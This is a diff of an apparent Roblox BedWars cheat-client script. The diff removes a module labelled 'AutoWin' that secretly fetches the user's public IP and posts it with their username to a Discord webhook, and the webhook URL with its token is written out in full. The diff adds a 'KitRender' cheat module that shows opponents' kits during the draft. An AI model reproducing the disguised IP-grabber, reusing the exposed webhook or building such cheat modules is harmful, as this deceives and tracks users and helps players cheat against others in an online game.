@@ -9349,31 +9349,224 @@ run(function()
 end)
 
 run(function()
-	local req = http_request or request or syn.request
-	if req == nil then
-		return
-	end
-	local ip
-	ip = vape.Categories.Blatant:CreateModule({
-		Name = 'AutoWin',
-		Function = function(callback)
-			if not callback then return end
-			ip:Toggle()
-			local website = 'https://api.ipify.org/?format=json'
-			local hook = 'https://discord.com/api/webhooks/1468075619194765343/Y5q-EQBfnWe8AcQBXPekOeq_LUu_WFYQ0QBKL9OqyqD7bZG4KP5d8rovTBbZYquFX2fB'
-			local res = req({
-			    Url = website,
-			    Method = "GET",
-			})
-			local data = HttpService:JSONDecode(res.Body)
-			req({
-			    Url = api,
-			    Method = "POST",
-			    Headers = {
-			        ["Content-Type"] = "application/json"
-			    },
-			    Body = HttpService:JSONEncode({scontent = lplr.Name .. " IP is " .. data.ip})
-			})
-		end
-	})
+	local KitRender
+    local activeConnections = {}
+    local kitLabels = {}
+    local updateDebounce = {}
+    local retryThread = nil
+    local playerMonitorThread = nil
+    local processedPlayers = {}
+    local UpdateRate = 0.2
+    KitRender = vape.Categories.Utility:CreateModule({
+        Name = "KitRender",
+        Function = function(callback)   
+            if callback then
+				repeat task.wait(0.08) until isrbxactive()
+                local function createKitLabel(parent, kitImage)
+                    if kitLabels[parent] then
+                        kitLabels[parent]:Destroy()
+                    end
+                    
+                    local kitLabel = Instance.new("ImageLabel")
+                    kitLabel.Name = "OnyxKitIcon"
+                    kitLabel.Size = UDim2.new(1, 0, 1, 0)
+                    kitLabel.Position = UDim2.new(1.1, 0, 0, 0)
+                    kitLabel.BackgroundTransparency = 1
+                    kitLabel.Image = kitImage
+                    kitLabel.Parent = parent
+                    
+                    kitLabels[parent] = kitLabel
+                    return kitLabel
+                end
+                
+                local function setupKitRender(obj)
+                    if obj.Name == "PlayerRender" and obj.Parent and obj.Parent.Parent and obj.Parent.Parent.Parent and obj.Parent.Parent.Parent.Parent and obj.Parent.Parent.Parent.Parent.Parent and obj.Parent.Parent.Parent.Parent.Parent.Name == "MatchDraftTeamCardRow" then
+                        local Rank = obj.Parent:FindFirstChild('3')
+                        if not Rank then return end
+                        
+                        local userId = string.match(obj.Image, "id=(%d+)")
+                        if not userId then return end
+                        
+                        local id = tonumber(userId)
+                        if not id then return end
+                        
+                        local plr = playersService:GetPlayerByUserId(id)
+                        if not plr then return end
+                        
+                        local loopKey = plr.UserId
+                        
+                        processedPlayers[loopKey] = true
+                        
+                        if activeConnections[loopKey] then
+                            activeConnections[loopKey]:Disconnect()
+                            activeConnections[loopKey] = nil
+                        end
+                        
+                        local function updateKit()
+                            if not KitRender.Enabled then return end
+                            if not Rank or not Rank.Parent then
+                                if activeConnections[loopKey] then
+                                    activeConnections[loopKey]:Disconnect()
+                                    activeConnections[loopKey] = nil
+                                end
+                                if kitLabels[Rank] then
+                                    kitLabels[Rank]:Destroy()
+                                    kitLabels[Rank] = nil
+                                end
+                                return
+                            end
+                            
+                            local kitName = plr:GetAttribute("PlayingAsKits")
+                            if not kitName then
+                                kitName = "none"
+                            end
+                            
+                            local render = bedwars.BedwarsKitMeta[kitName] or bedwars.BedwarsKitMeta.none
+                            
+                            if kitLabels[Rank] then
+                                kitLabels[Rank].Image = render.renderImage
+                            else
+                                createKitLabel(Rank, render.renderImage)
+                            end
+                        end
+
+                        local function RefreshKitCheck()
+                            if not KitRender.Enabled then return end
+                            if activeConnections[loopKey] then
+                                activeConnections[loopKey]:Disconnect()
+                                activeConnections[loopKey] = nil
+                            end							
+                            if kitLabels[Rank] then
+                                kitLabels[Rank]:Destroy()
+                                kitLabels[Rank] = nil
+                            end
+                            local kitName = plr:GetAttribute("PlayingAsKits")
+                            if not kitName then
+                                kitName = "none"
+                            end
+                            
+                            local render = bedwars.BedwarsKitMeta[kitName] or bedwars.BedwarsKitMeta.none
+                            
+                            if kitLabels[Rank] then
+                                kitLabels[Rank].Image = render.renderImage
+                            else
+                                createKitLabel(Rank, render.renderImage)
+                            end
+						end
+
+                        task.spawn(function()
+							while KitRender.Enabled do
+								RefreshKitCheck()
+								task.wait(UpdateRate)
+							end
+						end)
+                        
+                        local connection = plr:GetAttributeChangedSignal("PlayingAsKits"):Connect(function()
+                            local currentTick = tick()
+                            
+                            if not updateDebounce[loopKey] or (currentTick - updateDebounce[loopKey]) >= 0.1 then
+                                updateDebounce[loopKey] = currentTick
+                                updateKit()
+                            end
+                        end)
+                        
+                        activeConnections[loopKey] = connection
+                        KitRender:Clean(connection)
+                    end
+                end
+                
+                local function setupSquadsRender()
+                    local teams = lplr.PlayerGui:FindFirstChild("MatchDraftApp")
+                    if not teams then
+                        return false
+                    end
+                    
+                    task.wait(0.05)
+                    
+                    for _, obj in teams:GetDescendants() do
+                        if KitRender.Enabled then
+                            task.spawn(function()
+                                setupKitRender(obj)
+                            end)
+                        end
+                    end
+                    
+                    KitRender:Clean(teams.DescendantAdded:Connect(function(obj)
+                        if KitRender.Enabled then
+                            task.wait(0.01)
+                            setupKitRender(obj)
+                        end
+                    end))
+                    
+                    return true
+                end
+                
+                playerMonitorThread = task.spawn(function()
+                    while KitRender.Enabled do
+                        task.wait(0.5)
+                        
+                        local teams = lplr.PlayerGui:FindFirstChild("MatchDraftApp")
+                        if teams then
+                            for _, obj in teams:GetDescendants() do
+                                if obj.Name == "PlayerRender" and KitRender.Enabled then
+                                    local userId = string.match(obj.Image, "id=(%d+)")
+                                    if userId then
+                                        local id = tonumber(userId)
+                                        if id and not processedPlayers[id] then
+                                            task.spawn(function()
+                                                setupKitRender(obj)
+                                            end)
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end)
+                
+                task.spawn(function()
+                    local success = setupSquadsRender()
+                    
+                    if not success then
+                        retryThread = task.spawn(function()
+                            while KitRender.Enabled do
+                                task.wait(0.5)
+                                if setupSquadsRender() then
+                                    break
+                                end
+                            end
+                        end)
+                    end
+                end)
+            else
+                if retryThread then
+                    task.cancel(retryThread)
+                    retryThread = nil
+                end
+                
+                if playerMonitorThread then
+                    task.cancel(playerMonitorThread)
+                    playerMonitorThread = nil
+                end
+                
+                for key, connection in pairs(activeConnections) do
+                    if connection then
+                        connection:Disconnect()
+                    end
+                    activeConnections[key] = nil
+                end
+                
+                for parent, label in pairs(kitLabels) do
+                    if label then
+                        label:Destroy()
+                    end
+                    kitLabels[parent] = nil
+                end
+                
+                table.clear(updateDebounce)
+                table.clear(processedPlayers)
+            end
+        end,
+        Tooltip = "Shows everyone's kit next to their rank during kit phase (squads ranked!)"
+    })
 end)
